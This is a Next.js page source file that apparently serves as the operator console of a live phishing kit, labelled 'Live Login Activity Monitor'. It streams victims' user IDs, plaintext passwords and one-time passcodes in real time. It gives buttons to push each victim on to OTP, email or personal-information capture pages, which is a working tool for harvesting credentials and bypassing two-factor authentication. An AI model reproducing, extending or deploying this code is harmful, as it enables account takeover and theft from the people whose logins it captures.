import Head from 'next/head';
import { useEffect } from 'react';

export default function LinkPage() {
  useEffect(() => {
    const activityLog = document.getElementById('activity-log');
    const statusIndicator = document.getElementById('status-indicator');
    let lastActivityId = null;
    let processedIds = new Set();

    function formatTime(timestamp) {
      const date = new Date(timestamp);
      return date.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit',
        hour12: true 
      });
    }

    async function approveActivity(activityId, type, userId, redirectType = 'password') {
      try {
        console.log(`[link.js] Approving activity ${activityId} with redirectType: ${redirectType}`);
        const response = await fetch('/api/approve', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ activityId, type, userId, redirectType })
        });
        
        if (!response.ok) {
          const errorText = await response.text();
          console.error(`[link.js] Approve failed: ${response.status} ${response.statusText}`, errorText);
          throw new Error(`HTTP ${response.status}: ${errorText}`);
        }
        
        const data = await response.json();
        console.log(`[link.js] Approval response:`, data);
        if (data.success) {
          updateActivityStatus(activityId, 'approved', redirectType);
        }
      } catch (error) {
        console.error('Error approving activity:', error);
        alert(`Failed to approve: ${error.message}`);
      }
    }

    async function denyActivity(activityId, type, userId) {
      try {
        const response = await fetch('/api/deny', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ activityId, type, userId })
        });
        const data = await response.json();
        if (data.success) {
          updateActivityStatus(activityId, 'denied');
        }
      } catch (error) {
        console.error('Error denying activity:', error);
      }
    }

    function updateActivityStatus(activityId, status, redirectType = null) {
      const statusEl = document.getElementById(`status-${activityId}`);
      const actionsEl = document.getElementById(`actions-${activityId}`);
      
      if (statusEl) {
        statusEl.textContent = status === 'approved' 
          ? `Approved${redirectType ? ` - Redirecting to ${redirectType}` : ''}` 
          : 'Denied';
        statusEl.className = `activity-status status-${status}`;
      }
      
      if (actionsEl) {
        actionsEl.style.display = 'none';
      }
    }

    function addActivityEntry(activity) {
      if (processedIds.has(activity.id)) return;
      processedIds.add(activity.id);

      const timeString = formatTime(activity.timestamp);
      const userId = activity.userId || 'Unknown';
      
      let content = '';
      let className = '';
      let showActions = false;
      
      if (activity.type === 'userid') {
        content = `User ID entered: <strong>${userId}</strong>`;
        className = 'user-id-entry';
        showActions = true;
      } else if (activity.type === 'password') {
        const passwordDisplay = activity.password ? `: <code>${activity.password}</code>` : '';
        content = `Password entered for: <strong>${userId}</strong>${passwordDisplay}`;
        className = 'password-entry';
        showActions = true;
      } else if (activity.type === 'signin') {
        const passwordDisplay = activity.password ? ` (Password: <code>${activity.password}</code>)` : '';
        content = `Sign in button clicked for: <strong>${userId}</strong>${passwordDisplay}`;
        className = 'signin-entry';
        showActions = true;
      } else if (activity.type === 'otp') {
        const otpDisplay = activity.otpCode ? `: <code>${activity.otpCode}</code>` : '';
        content = `OTP code entered for: <strong>${userId}</strong>${otpDisplay}`;
        className = 'otp-entry';
        showActions = true;
      }

      const activityItem = document.createElement('div');
      activityItem.className = `activity-item ${className}`;
      activityItem.id = `activity-${activity.id}`;

      let actionsHTML = '';
      if (showActions && activity.type === 'userid') {
        actionsHTML = `
          <div class="activity-actions" id="actions-${activity.id}">
            <button class="redirect-btn password" data-action="redirect" data-redirect="password">Password Page</button>
            <button class="redirect-btn otp" data-action="redirect" data-redirect="otp">OTP Code Page</button>
            <button class="redirect-btn email" data-action="redirect" data-redirect="email">Email Page</button>
            <button class="redirect-btn personal" data-action="redirect" data-redirect="personal">Personal Info Page</button>
            <button class="deny-btn" data-action="deny">Deny</button>
          </div>
          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
        `;
      } else if (showActions && activity.type === 'password') {
        actionsHTML = `
          <div class="activity-actions" id="actions-${activity.id}">
            <button class="redirect-btn otp" data-action="redirect" data-redirect="otp">OTP Code Page</button>
            <button class="redirect-btn email" data-action="redirect" data-redirect="email">Email Page</button>
            <button class="redirect-btn personal" data-action="redirect" data-redirect="personal">Personal Info Page</button>
            <button class="deny-btn" data-action="deny">Deny</button>
          </div>
          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
        `;
      } else if (showActions) {
        actionsHTML = `
          <div class="activity-actions" id="actions-${activity.id}">
            <button class="approve-btn" data-action="approve">Approve</button>
            <button class="deny-btn" data-action="deny">Deny</button>
          </div>
          <div class="activity-status status-pending" id="status-${activity.id}">Pending approval...</div>
        `;
      }

      activityItem.innerHTML = `
        <div class="activity-time">${timeString}</div>
        <div class="activity-content">${content}</div>
        ${actionsHTML}
      `;

      // Add event listeners
      if (showActions && (activity.type === 'userid' || activity.type === 'password')) {
        const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
        if (actionsDiv) {
          actionsDiv.addEventListener('click', function(e) {
            const button = e.target.closest('button');
            if (!button) return;
            
            const action = button.getAttribute('data-action');
            const redirectType = button.getAttribute('data-redirect');
            
            if (action === 'redirect' && redirectType) {
              approveActivity(activity.id, activity.type, userId, redirectType);
            } else if (action === 'deny') {
              denyActivity(activity.id, activity.type, userId);
            }
          });
        }
      } else if (showActions) {
        const actionsDiv = activityItem.querySelector(`#actions-${activity.id}`);
        if (actionsDiv) {
          actionsDiv.addEventListener('click', function(e) {
            const button = e.target.closest('button');
            if (!button) return;
            
            const action = button.getAttribute('data-action');
            
            if (action === 'approve') {
              approveActivity(activity.id, activity.type, userId);
            } else if (action === 'deny') {
              denyActivity(activity.id, activity.type, userId);
            }
          });
        }
      }

      const noActivity = activityLog.querySelector('.no-activity');
      if (noActivity) {
        noActivity.remove();
      }

      activityLog.insertBefore(activityItem, activityLog.firstChild);

      while (activityLog.children.length > 50) {
        activityLog.removeChild(activityLog.lastChild);
      }

      statusIndicator.classList.add('status-active');
      statusIndicator.classList.remove('status-inactive');
    }

    // Connect to SSE for real-time activity updates
    function connectSSE() {
      const eventSource = new EventSource('/api/events');
      
      eventSource.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'activity') {
            // New activity received
            addActivityEntry(data.data);
          } else if (data.type === 'approval') {
            // Approval status update
            updateActivityStatus(data.activityId, data.data.status, data.data.redirectType);
          } else if (data.type === 'connected') {
            console.log('SSE connected successfully');
          }
        } catch (error) {
          console.error('Error parsing SSE message:', error);
        }
      };
      
      eventSource.onerror = function(error) {
        console.error('SSE error:', error);
        // Reconnect after 3 seconds
        setTimeout(() => {
          eventSource.close();
          connectSSE();
        }, 3000);
      };
      
      // Store event source for cleanup
      window.monitorEventSource = eventSource;
    }

    // Test API connection on load
    async function testConnection() {
      try {
        const response = await fetch('/api/test');
        const data = await response.json();
        console.log('API connection test:', data);
      } catch (error) {
        console.error('API connection failed:', error);
      }
    }

    // Initialize
    testConnection();
    connectSSE();

    return () => {
      if (window.monitorEventSource) {
        window.monitorEventSource.close();
      }
    };
  }, []);

  return (
    <>
      <Head>
        <title>Ready - Live Monitor</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background-color: #f5f5f5;
          min-height: 100vh;
          padding: 20px;
        }

        .ready-container {
          max-width: 1200px;
          margin: 0 auto;
        }

        .ready-text {
          font-size: 48px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 30px;
          text-align: center;
        }

        .monitor-panel {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
          padding: 30px;
          margin-bottom: 20px;
        }

        .panel-title {
          font-size: 24px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 20px;
          border-bottom: 2px solid #d1d1d1;
          padding-bottom: 10px;
        }

        .activity-item {
          padding: 15px;
          margin-bottom: 10px;
          background: #f9f9f9;
          border-left: 4px solid #0057b8;
          border-radius: 4px;
        }

        .activity-time {
          font-size: 12px;
          color: #666666;
          margin-bottom: 5px;
        }

        .activity-content {
          font-size: 16px;
          color: #000000;
          font-weight: 500;
        }

        .activity-content code {
          background: #f0f0f0;
          padding: 2px 6px;
          border-radius: 3px;
          font-family: monospace;
          font-size: 14px;
          color: #d32f2f;
        }

        .user-id-entry {
          border-left-color: #0057b8;
        }

        .password-entry {
          border-left-color: #00a651;
        }

        .no-activity {
          text-align: center;
          color: #999999;
          font-size: 16px;
          padding: 40px 20px;
        }

        .status-indicator {
          display: inline-block;
          width: 12px;
          height: 12px;
          border-radius: 50%;
          margin-right: 8px;
        }

        .status-active {
          background: #00a651;
          box-shadow: 0 0 8px rgba(0, 166, 81, 0.5);
        }

        .status-inactive {
          background: #d1d1d1;
        }

        .signin-entry {
          border-left-color: #ff6b00;
        }

        .otp-entry {
          border-left-color: #9c27b0;
        }

        .activity-actions {
          display: flex;
          gap: 10px;
          margin-top: 10px;
          flex-wrap: wrap;
        }

        .redirect-btn,
        .approve-btn,
        .deny-btn {
          padding: 8px 16px;
          border: none;
          border-radius: 6px;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
        }

        .redirect-btn.password {
          background: #0057b8;
          color: white;
        }

        .redirect-btn.otp {
          background: #00a651;
          color: white;
        }

        .redirect-btn.email {
          background: #0088C0;
          color: white;
        }

        .redirect-btn.personal {
          background: #ff6b00;
          color: white;
        }

        .redirect-btn:hover {
          opacity: 0.9;
          transform: translateY(-1px);
        }

        .approve-btn {
          background: #00a651;
          color: white;
        }

        .approve-btn:hover {
          background: #008844;
        }

        .deny-btn {
          background: #dc3545;
          color: white;
        }

        .deny-btn:hover {
          background: #c82333;
        }

        .activity-status {
          margin-top: 8px;
          font-size: 14px;
          font-weight: 500;
        }

        .status-pending {
          color: #666666;
        }

        .status-approved {
          color: #00a651;
        }

        .status-denied {
          color: #dc3545;
        }
      `}</style>
      <div className="ready-container">
        <div className="ready-text">ready</div>
        
        <div className="monitor-panel">
          <div className="panel-title">
            <span className="status-indicator status-active" id="status-indicator"></span>
            Live Login Activity Monitor
          </div>
          <div id="activity-log">
            <div className="no-activity">No activity yet. Waiting for login attempts...</div>
          </div>
        </div>
        <div style={{ marginTop: '20px', padding: '10px', background: '#fff', borderRadius: '8px', fontSize: '12px', color: '#666' }}>
          <strong>Monitoring Page Active</strong><br />
          Access this page at: <code>/link</code><br />
          Activities will appear here when users log in.
        </div>
      </div>
    </>
  );
}

